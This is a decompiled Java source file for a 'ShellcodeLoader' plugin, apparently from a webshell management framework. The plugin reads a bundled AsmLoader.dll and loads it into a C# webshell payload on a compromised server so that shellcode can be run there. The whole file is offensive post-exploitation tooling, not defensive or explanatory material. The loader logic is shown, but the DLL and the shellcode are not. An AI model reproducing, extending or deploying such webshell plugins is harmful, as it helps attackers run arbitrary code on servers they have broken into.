/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import util.Log;
import util.functions;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="ShellcodeLoader", DisplayName="ShellcodeLoader")
public class ShellcodeLoader
extends shells.plugins.generic.ShellcodeLoader {
    private static final String CLASS_NAME = "AsmLoader.Run";

    @Override
    public boolean load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/AsmLoader.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    GOptionPane.showMessageDialog(this.panel, "Load success", "\u63d0\u793a", 1);
                } else {
                    GOptionPane.showMessageDialog(this.panel, "Load fail", "\u63d0\u793a", 2);
                }
            } catch (Exception e) {
                Log.error(e);
                GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
            }
        }
        return this.loadState;
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }
}

